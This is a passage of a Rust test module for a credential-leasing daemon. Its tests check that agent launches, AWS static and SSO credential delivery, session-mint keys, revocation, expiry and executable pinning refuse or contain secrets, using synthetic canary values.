        for mode in ["agent-denied", "invalid", "removed", "aba", "session-aba", "hash", "mint-fail", "binding-mint"] {
            let (f, req) = sso_fixture(mode);
            if mode == "invalid" { f.st.lock().unwrap().sso_profiles.get_mut("aws/static").unwrap().dek_sha256 = None; }
            let prepared = f.send(req);
            if matches!(mode, "agent-denied" | "invalid") { assert!(prepared.is_err(), "{mode}"); assert!(f.st.lock().unwrap().aws.is_empty()); continue; }
            let prepared = prepared.unwrap();
            let mut shim = Shim::start_fault(&f, json!({"op":"launch_bind","id":prepared["id"]}), false, (mode == "binding-mint").then_some("sso-binding-mint"));
            assert_eq!(shim.response(), "bound");
            {
                let mut g = f.st.lock().unwrap();
                match mode {
                    "removed" | "aba" => {
                        let reg = g.sso_profiles.remove("aws/static").unwrap();
                        g.invalidate_registration("aws/static");
                        if mode == "aba" { g.sso_profiles.insert("aws/static".into(), reg); }
                    }
                    "session-aba" => g.invalidate_session("synthetic"),
                    "hash" => g.sso_profiles.get_mut("aws/static").unwrap().dek_sha256 = Some("0".repeat(64)),
                    _ => (),
                }
            }
            shim.finish(b'n');
            let g = f.st.lock().unwrap(); assert!(g.aws.is_empty(), "{mode}");
            assert_eq!(g.leases["aws/static"].uses, u32::from(matches!(mode, "hash" | "mint-fail" | "binding-mint")), "{mode}");
            drop(g); assert!(!bound(&f));
        }
    }

    #[test]
    #[cfg(debug_assertions)]
    fn launch_sso_blocked_prompt_containment() {
        for mode in ["cancel", "revoke"] {
            let (f, req) = sso_fixture(mode);
            let prepared = f.send(req).unwrap();
            let (entered_tx, entered_rx) = std::sync::mpsc::sync_channel(1);
            let (release_tx, release_rx) = std::sync::mpsc::sync_channel(1);
            let prompts = Arc::new(Mutex::new(vec![]));
            let setup = sso_auth_setup(&f, "sso", prompts.clone(), Some((entered_tx, release_rx)));
            let mut shim = Shim::start_auth(&f, json!({"op":"launch_bind","id":prepared["id"]}), false, None, Some(setup));
            assert_eq!(shim.response(), "bound");
            shim.child.stdin.as_mut().unwrap().write_all(b"n").unwrap();
            entered_rx.recv_timeout(Duration::from_secs(5)).unwrap();
            assert_eq!(opens(&shim), 0);
            if mode == "cancel" { f.send(Req::LaunchCancel { id: prepared["id"].as_str().unwrap().into() }).unwrap(); }
            else { f.send(Req::Revoke { patterns: vec!["aws/*".into()] }).unwrap(); }
            release_tx.send(()).unwrap();
            assert!(shim.child.wait().unwrap().success()); shim.handler.take().unwrap().join().unwrap();
            assert_eq!(*prompts.lock().unwrap(), vec!["sso"]);
            assert!(f.st.lock().unwrap().aws.is_empty()); assert!(!bound(&f)); assert_eq!(opens(&shim), 0);
        }
    }

    #[test]
    fn launch_static_aws_and_session_containment() {
        for mode in ["eof", "byte", "cancel", "revoke", "death", "ttl", "close", "lease"] {
            let (mut f, req) = aws_fixture(&static_test_creds().to_json().unwrap());
            let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
            f.http_port = listener.local_addr().unwrap().port();
            let p = f.p.clone(); let st = f.st.clone();
            let http = std::thread::spawn(move || {
                for _ in 0..2 { serve_aws(listener.accept().unwrap().0, &st, &p).unwrap(); }
            });
            let prepared = f.send(req).unwrap();
            assert_eq!(prepared.as_object().unwrap().len(), 2);
            assert!(prepared.get("url").is_none() && prepared.get("token").is_none());
            assert!(f.st.lock().unwrap().aws.is_empty());
            let mut shim = Shim::start(&f, json!({"op":"launch_bind","id":prepared["id"]}), false);
            assert_eq!(shim.response(), "bound");
            shim.child.stdin.as_mut().unwrap().write_all(b"s").unwrap();
            let until = Instant::now() + Duration::from_secs(10);
            loop {
                if std::fs::read_to_string(shim.ready.with_extension("result")).is_ok_and(|s| s == "aws-delivered") { break; }
                assert!(shim.child.try_wait().unwrap().is_none(), "AWS shim failed: {mode}");
                assert!(Instant::now() < until, "AWS delivery timeout: {mode}");
                std::thread::sleep(Duration::from_millis(10));
            }
            http.join().unwrap();
            let id = {
                let g = f.st.lock().unwrap();
                assert_eq!(g.aws.len(), 1);
                let (id, ep) = g.aws.iter().next().unwrap();
                assert!(ep.expires.duration_since(Instant::now()).as_secs() >= 4*3600-15);
                assert!(ep.expires.duration_since(Instant::now()) <= Duration::from_secs(4*3600));
                assert_eq!(g.leases["aws/static"].uses, 1);
                assert!(g.keeps_alive(now()));
                id.clone()
            };
            match mode {
                "cancel" => { f.send(Req::LaunchCancel { id: prepared["id"].as_str().unwrap().into() }).unwrap(); }
                "revoke" => { f.send(Req::Revoke { patterns: vec!["aws/*".into()] }).unwrap(); }
                "death" => { shim.child.kill().unwrap(); shim.child.wait().unwrap(); expire_launches(&f.p, &f.st, now()); }
                "ttl" => { f.st.lock().unwrap().aws.get_mut(&id).unwrap().expires = Instant::now(); expire_leases(&f.p, &f.st, now()); }
                "close" => { f.send(Req::AwsClose { id }).unwrap(); }
                "lease" => {
                    let expiry = f.st.lock().unwrap().leases["aws/static"].info.expires;
                    expire_leases(&f.p, &f.st, expiry);
                    assert_eq!(f.st.lock().unwrap().aws.len(), 1, "legacy endpoint survives lease expiry");
                }
                _ => (),
            }
            if mode != "death" { shim.finish(match mode { "byte" => b'x', "eof" | "lease" => b'e', _ => b'c' }); }
            else { shim.handler.take().unwrap().join().unwrap(); }
            assert!(f.st.lock().unwrap().aws.is_empty(), "{mode}");
            assert!(!bound(&f), "{mode}");
        }
    }

    fn mint_source_creds(id: &str) -> crate::aws::AwsCreds {
        crate::aws::AwsCreds { access_key_id: id.into(), secret_access_key: "long-term-secret-canary".into(), session_token: None, region: Some("us-east-1".into()), session_mint: true }
    }

    /// A session_mint profile serves only the minted session; the long-term key
    /// never reaches the endpoint. A failed exchange refuses the launch.
    #[test]
    fn launch_session_mint_serves_minted_session_not_the_key() {
        for mode in ["minted", "exchange-fails"] {
            let id = if mode == "minted" { "AKIASYNTHETICKEY001" } else { "AKIAFAILMINT000001" };
            let (mut f, req) = aws_fixture(&mint_source_creds(id).to_json().unwrap());
            let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
            f.http_port = listener.local_addr().unwrap().port();
            let (p, st) = (f.p.clone(), f.st.clone());
            let http = (mode == "minted").then(|| std::thread::spawn(move || {
                for _ in 0..2 { serve_aws(listener.accept().unwrap().0, &st, &p).unwrap(); }
            }));
            let prepared = f.send(req).unwrap();
            let mut shim = Shim::start(&f, json!({"op":"launch_bind","id":prepared["id"]}), false);
            assert_eq!(shim.response(), "bound");
            if mode == "exchange-fails" {
                shim.finish(b'n'); // redeem must be refused
                assert!(f.st.lock().unwrap().aws.is_empty(), "no endpoint when the exchange fails");
                assert!(!bound(&f));
                continue;
            }
            shim.child.stdin.as_mut().unwrap().write_all(b"M").unwrap();
            let until = Instant::now() + Duration::from_secs(10);
            loop {
                if std::fs::read_to_string(shim.ready.with_extension("result")).is_ok_and(|s| s == "aws-delivered") { break; }
                assert!(shim.child.try_wait().unwrap().is_none(), "AWS shim failed");
                assert!(Instant::now() < until, "AWS delivery timeout");
                std::thread::sleep(Duration::from_millis(10));
            }
            http.unwrap().join().unwrap();
            {
                let g = f.st.lock().unwrap();
                let ep = g.aws.values().next().unwrap();
                assert!(ep.creds.contains("minted-secret-canary") && ep.creds.contains("ASIAMINTEDSESSION"));
                assert!(!ep.creds.contains("long-term-secret-canary") && !ep.creds.contains(id), "key must not be served");
                let left = ep.expires.duration_since(Instant::now()).as_secs();
                assert!((3500..=crate::aws::MINT_SECONDS).contains(&left), "endpoint outlives the 1 h session: {left}");
            }
            shim.finish(b'e');
        }
    }

    /// A session_mint key must not leave through the plain `-e VAR=aws/NAME` path either:
    /// redeem refuses (the shim's `n` action asserts the reply is the opaque refusal).
    #[test]
    fn launch_session_mint_key_is_refused_as_a_plain_env_value() {
        let (f, mut req) = aws_fixture(&mint_source_creds("AKIASYNTHETICKEY001").to_json().unwrap());
        if let Req::LaunchPrepare { env, aws, .. } = &mut req {
            *aws = None;
            env.insert("RAW".into(), "aws/static".into());
        }
        let prepared = f.send(req).unwrap();
        let mut shim = redeem_shim(&f, &prepared, None);
        shim.finish(b'n');
        assert!(!bound(&f));
    }

    #[test]
    fn launch_static_aws_sso_and_alias_refusals() {
        for mode in ["registered", "unregistered", "appeared", "alias", "bad-name", "dead", "write"] {
            let value = if mode == "unregistered" { crate::sso::entry_json(&static_registration().profile).unwrap() } else { static_test_creds().to_json().unwrap() };
            let (f, mut req) = aws_fixture(&value);
            if mode == "registered" { f.st.lock().unwrap().sso_profiles.insert("aws/static".into(), static_registration()); }
            if let Req::LaunchPrepare { env, aws, .. } = &mut req {
                if mode == "alias" { env.insert("RAW".into(), "aws/static".into()); }
                if mode == "bad-name" { *aws = Some("test/ref".into()); }
            }
            let prepared = f.send(req);
            if matches!(mode, "registered" | "alias" | "bad-name") { assert!(prepared.is_err(), "{mode}"); continue; }
            let prepared = prepared.unwrap();
            let mut shim = Shim::start_fault(&f, json!({"op":"launch_bind","id":prepared["id"]}), false, if mode == "write" { Some("redeem-write") } else { None });
            assert_eq!(shim.response(), "bound");
            if mode == "appeared" { f.st.lock().unwrap().sso_profiles.insert("aws/static".into(), static_registration()); }
            if mode == "dead" {
                shim.child.kill().unwrap(); shim.child.wait().unwrap(); shim.handler.take().unwrap().join().unwrap();
            } else { shim.finish(b'n'); }
            assert!(f.st.lock().unwrap().aws.is_empty(), "{mode}");
            assert!(!bound(&f), "{mode}");
        }
    }

    #[test]
    fn launch_redeem_oversize_refuse_without_open() {
        for mode in ["oversize", "malformed", "escaped"] {
            let f = Fixture::redeem(); let req = f.req();
            let prepared = f.send(req).unwrap(); let mut shim = redeem_shim(&f, &prepared, None);
            shim.finish(match mode { "oversize" => b'o', "malformed" => b'f', "escaped" => b'e', _ => b'n' });
            assert_eq!(opens(&shim), 0); assert!(!bound(&f));
            assert_eq!(f.st.lock().unwrap().leases["test/ref"].uses, 0);
        }
    }

    #[test]
    fn launch_redeem_target_replaced_after_prepare() {
        use std::os::unix::fs::PermissionsExt;
        let f = Fixture::redeem(); let target = f.p.root.join("target");
        std::fs::write(&target, b"synthetic target, never executed").unwrap();
        std::fs::set_permissions(&target, std::fs::Permissions::from_mode(0o700)).unwrap();
        f.st.lock().unwrap().leases.get_mut("test/ref").unwrap().scope.cmds = vec![CommandBinding::from(target.to_str().unwrap()).pin().unwrap()];
        let mut req = f.req(); if let Req::LaunchPrepare { argv, target: requested_target, .. } = &mut req { *requested_target = target.clone(); argv[0] = target.to_str().unwrap().into(); }
        let prepared = f.send(req).unwrap(); let mut shim = redeem_shim(&f, &prepared, None);
        std::fs::write(&target, b"replacement target").unwrap();
        shim.finish(b'n'); assert_eq!(opens(&shim), 0); assert!(!bound(&f));
        assert_eq!(f.st.lock().unwrap().leases["test/ref"].uses, 0);
    }

    #[test]
    fn launch_redeem_external_failures_burn_and_audit_precedes_open() {
        // ...but must still win: refused, zero uses, zero opens.
        for stage in ["redeem-kernel", "redeem-verify", "redeem-revoke", "redeem-cancel", "redeem-intent", "redeem-open", "redeem-write"] {
            let f = Fixture::redeem(); let prepared = redeem_prepare(&f);
            let mut shim = redeem_shim(&f, &prepared, Some(stage));
            shim.finish(b'n'); assert!(!bound(&f));
            assert_eq!(opens(&shim), usize::from(matches!(stage, "redeem-open" | "redeem-write")), "{stage}");
            if stage != "redeem-revoke" {
                assert_eq!(f.st.lock().unwrap().leases["test/ref"].uses, u32::from(matches!(stage, "redeem-intent" | "redeem-open" | "redeem-write")));
            }
        }
    }

    #[test]
    fn launch_redeem_classification_change_refused() {
        let f = Fixture::redeem();
        let mut changed_peer = f.peer.clone(); changed_peer.caller.env_unknown = !changed_peer.caller.env_unknown;
        let prepared = handle_as(&f.p, &f.st, changed_peer, f.req(), 0, None, Ok).unwrap();
        let mut shim = redeem_shim(&f, &prepared, None); shim.finish(b'n');
        assert_eq!(opens(&shim), 0); assert_eq!(f.st.lock().unwrap().leases["test/ref"].uses, 0);
    }

    #[test]
    fn launch_redeem_original_deadline_expires_without_sweep() {
        let f = Fixture::redeem(); let prepared = redeem_prepare(&f);
        let owner = agent::process_identity(f.peer.pid).unwrap();
        let id = prepared["id"].as_str().unwrap();
        let expiry = {
            let mut g = f.st.lock().unwrap();
            let taken = g.pending_launches.take_and_burn(id, owner, now()).unwrap();
            // A new ID because tombstones cannot be overwritten.
            g.pending_launches.insert(format!("{id}-aged"), owner, taken.launch, now()-crate::launch::LAUNCH_TTL+10).unwrap().1
        };
        let mut shim = redeem_shim(&f, &json!({"id":format!("{id}-aged")}), None);
        while now() < expiry { std::thread::sleep(Duration::from_millis(20)); }
        shim.finish(b'n'); assert_eq!(opens(&shim), 0); assert!(!bound(&f));
        assert_eq!(f.st.lock().unwrap().leases["test/ref"].uses, 0);
    }

    #[test]
    fn launch_redeem_shim_dies_during_verification() {
        let f = Fixture::redeem(); let prepared = redeem_prepare(&f);
        let mut shim = redeem_shim(&f, &prepared, Some("redeem-kill"));
        shim.child.stdin.take().unwrap().write_all(b"n").unwrap();
        assert!(!shim.child.wait().unwrap().success());
        shim.handler.take().unwrap().join().unwrap();
        assert_eq!(opens(&shim), 0); assert!(!bound(&f));
        assert_eq!(f.st.lock().unwrap().leases["test/ref"].uses, 0);
    }

    #[test]
    fn launch_redeem_refuses_owner_that_changed_executable_after_prepare() {
        let f = Fixture::redeem(); let prepared = redeem_prepare(&f);
        let mut shim = redeem_shim(&f, &prepared, Some("redeem-owner-swap"));
        shim.finish(b'n');
        assert_eq!(opens(&shim), 0); assert!(!bound(&f));
        assert_eq!(f.st.lock().unwrap().leases["test/ref"].uses, 0);
    }

    #[test]
    fn owner_executable_snapshot_detects_path_content_and_file_replacement() {
        let dir = PathBuf::from("/tmp").join(format!("karambit-owner-exe-{:016x}", rand::random::<u64>()));
        std::fs::create_dir_all(&dir).unwrap();
        let dir = std::fs::canonicalize(dir).unwrap(); // /tmp is a symlink; Prepare records the canonical path
        let exe = dir.join("owner");
        std::fs::write(&exe, b"owner v1").unwrap();
        let recorded = CommandBinding::snapshot_regular_file(&exe, false).unwrap().unwrap();
        let owner = agent::ProcessIdentity { pid: 1, sec: 0, usec: 0 };
        let runs = |path: &Path| { let p = path.to_string_lossy().into_owned(); PROC_EXE_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(move |_| Some(p.clone())))); };
        runs(&exe);
        check_owner_exe(owner, &recorded).unwrap();
        // Same size, different bytes at the same path.
        std::fs::write(&exe, b"owner v2").unwrap();
        assert!(check_owner_exe(owner, &recorded).is_err());
        // Identical bytes in a new file (new inode) renamed over the path.
        std::fs::write(&exe, b"owner v1").unwrap();
        check_owner_exe(owner, &recorded).unwrap();
        let other = dir.join("replacement");
        std::fs::write(&other, b"owner v1").unwrap();
        std::fs::rename(&other, &exe).unwrap();
        assert!(check_owner_exe(owner, &recorded).is_err(), "inode changed");
        // A different path, and a vanished executable.
        std::fs::write(&other, b"owner v1").unwrap();
        runs(&other);
        assert!(check_owner_exe(owner, &recorded).is_err());
        PROC_EXE_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(|_| None)));
        assert!(check_owner_exe(owner, &recorded).is_err());
        PROC_EXE_HOOK.with(|h| h.borrow_mut().take());
        let _ = std::fs::remove_dir_all(dir);
    }

    #[test]
    fn launch_bind_positive_sibling_and_close() {
        let f = Fixture::new(); let prepared = f.prepare();
        assert!(prepared.get("token").is_none());
        let req = json!({"op":"launch_bind","id":prepared["id"]});
        let mut shim = Shim::start(&f, req.clone(), false);
        assert_eq!(shim.response(), "bound"); assert!(bound(&f));
        let mut sibling = Shim::start(&f, req, false);
        assert_eq!(sibling.response(), "refused"); sibling.finish(b'c');
        assert!(bound(&f));
        shim.finish(b'c'); assert!(!bound(&f));
        let records = f.records();
        let intent = records.iter().find(|r| r["action"] == "launch-bind" && r["phase"] == "intent").unwrap();
        assert_eq!(intent["detail"]["owner"]["pid"], std::process::id());
        assert!(intent["detail"]["shim"]["pid"].is_number());
        assert!(intent["detail"]["target"].is_object());
    }

    #[test]
    fn launch_bind_original_deadline_timeout_and_idle() {
        let f = Fixture::new(); let prepared = f.prepare(); let id = prepared["id"].as_str().unwrap();
        let owner = agent::process_identity(f.peer.pid).unwrap();
        {
            let mut g = f.st.lock().unwrap();
            let launch = g.pending_launches.take_and_burn(id, owner, now()).unwrap();
            g.pending_launches = Default::default();
            g.pending_launches.insert(id.into(), owner, launch.launch, now()-crate::launch::LAUNCH_TTL+10).unwrap();
        }
        let mut shim = Shim::start(&f, json!({"op":"launch_bind","id":id}), false);
        assert_eq!(shim.response(), "bound");
        {
            let mut g = f.st.lock().unwrap(); g.leases.clear();
            assert!(g.keeps_alive(now()));
            assert!(!g.keeps_alive(now()+11));
        }
        let start = Instant::now(); shim.finish(b't');
        assert!(start.elapsed() < Duration::from_secs(12)); assert!(!bound(&f));
    }

    #[test]
    fn launch_bind_rng_and_intent_failure_leave_no_bound_authority() {
        for fault in ["rng", "intent"] {
            let f = Fixture::new(); let prepared = f.prepare();
            let mut shim = Shim::start_fault(&f, json!({"op":"launch_bind", "id":prepared["id"]}), false, Some(fault));
            assert_eq!(shim.response(), "refused"); shim.finish(b'c'); assert!(!bound(&f));
        }
    }

    #[test]
    fn launch_bind_sweep_checks_dead_shim_without_socket_cleanup() {
        let f = Fixture::new(); let prepared = f.prepare();
        let id = prepared["id"].as_str().unwrap();
        let mut child = std::process::Command::new("/bin/sleep").arg("10").spawn().unwrap();
        let shim = agent::process_identity(child.id() as i32).unwrap();
        let owner = agent::process_identity(f.peer.pid).unwrap();
        let taken = f.st.lock().unwrap().pending_launches.bind(id, owner, shim, now()).unwrap();
        assert_eq!(taken.owner, owner); assert_eq!(taken.expires_at, prepared["expires_at"].as_u64().unwrap());
        assert_eq!(taken.created_at + crate::launch::LAUNCH_TTL, taken.expires_at);
        expire_launches(&f.p, &f.st, now()); assert!(bound(&f));
        child.kill().unwrap(); child.wait().unwrap();
        expire_launches(&f.p, &f.st, now()); assert!(!bound(&f));
    }

    #[test]
    fn launch_bind_bad_exe_hash() {
        let f = Fixture::new(); let prepared = f.prepare();
        let mut shim = Shim::start(&f, json!({"op":"launch_bind","id":prepared["id"]}), true);
        assert_eq!(shim.response(), "refused"); shim.finish(b'c'); assert!(!bound(&f));
    }

    #[test]
    fn launch_bind_unrelated_process() {
        let f = Fixture::new();
        let mut owner = Shim::start(&f, json!({"op":"launch_prepare",
            "refs":["test/ref"], "env":{"VALUE":"test/ref"}, "target":"/usr/bin/true", "argv":["/usr/bin/true"], "cwd": f.p.root
        }), false);
        let id = owner.response(); assert_ne!(id, "refused");
        // The test parent is not a child of this real Prepare owner.
        let socket = f.p.root.join("unrelated"); let listener = UnixListener::bind(&socket).unwrap();
        let mut client = UnixStream::connect(socket).unwrap();
        let (server, _) = listener.accept().unwrap();
        let p = f.p.clone(); let st = f.st.clone();
        let handler = std::thread::spawn(move || serve_connection(p, st, server, unsafe { libc::getuid() }, 0));
        writeln!(client, "{}", json!({"op":"launch_bind", "id":id})).unwrap();
        let mut response = String::new(); BufReader::new(client).read_line(&mut response).unwrap();
        assert_eq!(serde_json::from_str::<Value>(&response).unwrap(), json!({"error":"launch refused"}));
        handler.join().unwrap(); owner.finish(b'c'); assert!(!bound(&f));
    }

    #[test]
    fn launch_bind_any_frame_and_oversized() {
        for action in *b"fo" {
            let f = Fixture::new(); let prepared = f.prepare();
            let mut shim = Shim::start(&f, json!({"op":"launch_bind","id":prepared["id"]}), false);
            assert_eq!(shim.response(), "bound"); shim.finish(action); assert!(!bound(&f));
        }
    }

    #[test]
    fn launch_bind_cancel_revoke_deadline_and_death() {
        for action in ["cancel", "revoke", "deadline", "death", "lease"] {
            let f = Fixture::new(); let prepared = f.prepare(); let id = prepared["id"].as_str().unwrap();
            let mut shim = Shim::start(&f, json!({"op":"launch_bind","id":id}), false);
            assert_eq!(shim.response(), "bound");
            let expiry = prepared["expires_at"].as_u64().unwrap();
            assert!(f.st.lock().unwrap().pending_launches.has_live_bound(expiry-1));
            assert!(!f.st.lock().unwrap().pending_launches.has_live_bound(expiry));
            match action {
                "cancel" => { let v = f.send(Req::LaunchCancel { id: id.into() }).unwrap(); assert!(v.get("token").is_none()); }
                "revoke" => { f.send(Req::Revoke { patterns: vec!["test/*".into()] }).unwrap(); }
                "deadline" => expire_launches(&f.p, &f.st, expiry),
                "death" => { shim.child.kill().unwrap(); shim.child.wait().unwrap(); expire_launches(&f.p, &f.st, now()); }
                "lease" => { let expiry = f.st.lock().unwrap().leases["test/ref"].info.expires; expire_leases(&f.p, &f.st, expiry); }
                _ => unreachable!(),
            }
            assert!(!bound(&f), "{action}");
            if action != "death" { shim.finish(b'f'); }
        }
    }

    #[test]
    fn launch_prepare_returns_only_id_expiry_and_no_helper_or_endpoint() {
        let f = Fixture::new();
        let calls = Rc::new(Cell::new(0));
        let c = calls.clone(); crate::platform::helper::ECDH_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(move |_| { c.set(c.get()+1); bail!("unexpected unwrap") })));
        let c = calls.clone(); crate::platform::helper::AUTH_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(move || { c.set(c.get()+1); bail!("unexpected auth") })));
        let c = calls.clone(); crate::platform::helper::CALL_AT_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(move |_,_| { c.set(c.get()+1); bail!("unexpected helper") })));
        let req = f.req();
        let before = now();
        let response = f.send(req).unwrap();
        assert_eq!(response.as_object().unwrap().keys().map(String::as_str).collect::<Vec<_>>(), ["expires_at", "id"]);
        assert_eq!(response["id"].as_str().unwrap().len(), 32);
        assert!(response["expires_at"].as_u64().unwrap() >= before + crate::launch::LAUNCH_TTL);
        assert_eq!(calls.get(), 0);
        let g = f.st.lock().unwrap();
        assert_eq!(g.leases["test/ref"].uses, 0);
        assert!(g.aws.is_empty() && g.sso.is_empty() && g.sso_creds.is_empty());
        drop(g);
        let events = f.records();
        let intent = events.iter().find(|e| e["action"] == "launch-prepare" && e["phase"] == "intent").unwrap();
        assert!(intent["detail"]["target"]["path"].as_str().unwrap().ends_with("/true"));
        assert_eq!(intent["detail"]["target"]["sha256"].as_str().unwrap().len(), 64);
        assert_eq!(intent["detail"]["argv"], json!(["/usr/bin/true"]));
        assert!(intent["detail"]["cwd"].is_string());
        assert!(intent["detail"]["script"].is_null());
    }

    #[test]
    fn launch_prepare_audit_failure_prevents_insert() {
        let f = Fixture::new();
        crate::audit::fail_phase(Some("intent"));
        assert!(f.send(f.req()).is_err());
        assert!(!f.st.lock().unwrap().pending_launches.has_pending());
    }

    #[test]
    fn launch_prepare_requires_pinned_cli_and_lease() {
        let f = Fixture::new();
        std::fs::write(f.p.keys().join("daemon.sha256"), "not-the-cli").unwrap();
        assert!(f.send(f.req()).is_err());
        assert!(!f.st.lock().unwrap().pending_launches.has_pending());
        let f = Fixture::new();
        f.st.lock().unwrap().leases.clear();
        assert!(f.send(f.req()).is_err(), "agent without explicit lease must fail");
        assert!(!f.st.lock().unwrap().pending_launches.has_pending());
    }

    #[test]
    fn launch_prepare_enforces_live_grantee_cwd_expiry_and_uses() {
        for mode in ["grantee", "cwd", "expiry", "uses", "legacy"] {
            let f = Fixture::new();
            {
                let mut g = f.st.lock().unwrap(); let h = g.leases.get_mut("test/ref").unwrap();
                match mode {
                    "grantee" => h.info.to = Grantee::Human,
                    "cwd" => h.scope.cwd = Some("/no-such-synthetic-scope".into()),
                    "expiry" => h.info.expires = now(),
                    "uses" => { h.scope.max_uses = Some(1); h.uses = 1; },
                    _ => h.scope.cmds = vec![CommandBinding::from("true")],
                }
            }
            assert!(f.send(f.req()).is_err(), "{mode}");
            assert!(!f.st.lock().unwrap().pending_launches.has_pending());
        }
    }

    #[test]
    fn launch_prepare_capacity_refusal_is_audited() {
        let f = Fixture::new();
        // Prepares are slow under a loaded parallel suite; keep the 30s TTL from
        // expiring early entries and the fixture's 60s lease from expiring mid-loop,
        // so capacity (not timing) decides the 17th.
        f.st.lock().unwrap().leases.get_mut("test/ref").unwrap().info.expires = now() + 3600;
        for _ in 0..16 {
            let id = f.prepare()["id"].as_str().unwrap().to_string();
            f.st.lock().unwrap().pending_launches.test_deadline(&id, now() + 3600);
        }
        assert!(f.send(f.req()).is_err());
        let records = f.records();
        assert_eq!(records.iter().filter(|e| e["action"] == "launch-prepare" && e["phase"] == "intent").count(), 17);
        assert_eq!(records.iter().filter(|e| e["action"] == "launch-prepare" && e["phase"] == "outcome").count(), 17);
        assert_eq!(records.iter().filter(|e| e["action"] == "launch-prepare" && e["phase"] == "outcome" && e["ok"] == false).count(), 1);
        assert_eq!(f.st.lock().unwrap().leases["test/ref"].uses, 0);
    }

    #[test]
    fn launch_prepare_request_sweeps_expired_entries() {
        let f = Fixture::new(); let response = f.prepare();
        let owner = agent::process_identity(f.peer.pid).unwrap();
        let id = crate::launch::PendingLaunches::new_id().unwrap();
        {
            let mut g = f.st.lock().unwrap();
            let launch = g.pending_launches.take_and_burn(response["id"].as_str().unwrap(), owner, now()).unwrap();
            g.pending_launches.insert(id.clone(), owner, launch.launch, now()-crate::launch::LAUNCH_TTL).unwrap();
        }
        f.send(Req::Ping).unwrap();
        assert!(!f.st.lock().unwrap().pending_launches.has_pending());
        assert!(f.st.lock().unwrap().pending_launches.take_and_burn(&id, owner, now()).is_err());
    }

    #[test]
    fn launch_prepare_scope_pin_mismatch_refused() {
        let f = Fixture::new();
        let other = CommandBinding::from("/bin/echo").pin().unwrap();
        f.st.lock().unwrap().leases.get_mut("test/ref").unwrap().scope.cmds = vec![other];
        assert!(f.send(f.req()).is_err());
        assert!(!f.st.lock().unwrap().pending_launches.has_pending());
    }

    #[test]
    fn launch_prepare_requires_explicit_target() {
        let f = Fixture::new();
        let mut wire = serde_json::to_value(f.req()).unwrap();
        wire.as_object_mut().unwrap().remove("target");
        assert!(serde_json::from_value::<Req>(wire).is_err());
    }

    #[test]
    fn launch_prepare_validates_env_refs_and_duplicates() {
        let f = Fixture::new();
        for key in ["", "1NAME", "A=B", "A\0B", "é"] {
            let mut req = f.req();
            if let Req::LaunchPrepare { env, .. } = &mut req { *env = [(key.into(), "test/ref".into())].into(); }
            assert!(f.send(req).is_err());
        }
        for refs in [vec![], vec!["extra".into()], vec!["test/ref".into(), "test/ref".into()]] {
            let mut req = f.req();
            if let Req::LaunchPrepare { refs: r, .. } = &mut req { *r = refs; }
            assert!(f.send(req).is_err());
        }
        let wire = r#"{"op":"launch_prepare","target":"/usr/bin/true","refs":["test/ref"],"env":{"VALUE":"test/ref","VALUE":"other/ref"},"argv":["/usr/bin/true"],"cwd":"/tmp"}"#;
        assert!(serde_json::from_str::<Req>(wire).is_err());
        assert!(!f.st.lock().unwrap().pending_launches.has_pending());
    }

    #[test]
    fn launch_prepare_capture_outside_state_and_revoke_wins() {
        let f = Fixture::new();
        let state = f.st.clone(); let paths = f.p.clone();
        LAUNCH_CAPTURE_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(move || {
            assert!(state.try_lock().is_ok(), "LaunchBinding capture must not hold State");
            handle_as(&paths, &state, agent::Peer::default(), Req::Revoke { patterns: vec!["*".into()] }, 0, None, Ok).unwrap();
        })));
        assert!(f.send(f.req()).is_err());
        assert!(!f.st.lock().unwrap().pending_launches.has_pending());
    }

    #[test]
    fn launch_prepare_scope_change_during_capture_refused() {
        let f = Fixture::new(); let state = f.st.clone();
        LAUNCH_CAPTURE_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(move || {
            state.try_lock().unwrap().leases.get_mut("test/ref").unwrap().scope.cmds.clear();
        })));
        assert!(f.send(f.req()).is_err());
        assert!(!f.st.lock().unwrap().pending_launches.has_pending());
    }

    #[test]
    fn launch_prepare_revoke_and_cancel_burn_despite_audit_failure() {
        for patterns in [vec!["*".into()], vec!["test/ref".into()]] {
            let f = Fixture::new(); let response = f.prepare();
            crate::audit::fail_phase(Some("all"));
            f.send(Req::Revoke { patterns }).unwrap();
            let owner = agent::process_identity(f.peer.pid).unwrap();
            assert!(f.st.lock().unwrap().pending_launches.take_and_burn(response["id"].as_str().unwrap(), owner, now()).is_err());
        }
        let f = Fixture::new(); let response = f.prepare();
        let id = response["id"].as_str().unwrap().to_owned();
        crate::audit::fail_phase(Some("all"));
        f.send(Req::LaunchCancel { id: id.clone() }).unwrap();
        f.send(Req::LaunchCancel { id: id.clone() }).unwrap();
        assert!(f.send(Req::LaunchCancel { id: "unknown".into() }).is_err());
        assert!(f.st.lock().unwrap().pending_launches.take_and_burn(&id, agent::process_identity(f.peer.pid).unwrap(), now()).is_err());
    }

    #[test]
    fn launch_prepare_expiry_releases_idle_liveness_on_tick() {
        let f = Fixture::new(); let response = f.prepare();
        let expiry = response["expires_at"].as_u64().unwrap();
        // Isolate pending launches from other daemon liveness sources. The usual
        // 20-minute idle timeout and active-request counter remain unchanged.
        f.st.lock().unwrap().leases.clear();
        assert!(f.st.lock().unwrap().keeps_alive(expiry-1));
        expire_launches(&f.p, &f.st, expiry+5);
        assert!(!f.st.lock().unwrap().keeps_alive(expiry+5));
        let owner = agent::process_identity(f.peer.pid).unwrap();
        assert!(f.st.lock().unwrap().pending_launches.take_and_burn(response["id"].as_str().unwrap(), owner, expiry+5).is_err());
        let events = f.records();
        assert!(events.iter().any(|e| e["action"] == "launch-expire" && e["detail"]["kind"] == "containment" && e["detail"]["target"]["sha256"].is_string()));
    }

    // ---- The long-lived session-mint key never leaves the daemon for an agent ----

    /// `aws/static` as an agent-allowed Open entry (so plain policy would let the agent read
    /// it) with an unscoped lease held for the agent, holding either a session_mint key or a
    /// plain one as a control.
    fn mint_legacy_fixture(session_mint: bool) -> Fixture {
        let creds = if session_mint { mint_source_creds("AKIASYNTHETICKEY001") } else { static_test_creds() };
        let (f, _) = aws_fixture(&creds.to_json().unwrap());
        let dek = f.st.lock().unwrap().leases["aws/static"].dek.clone();
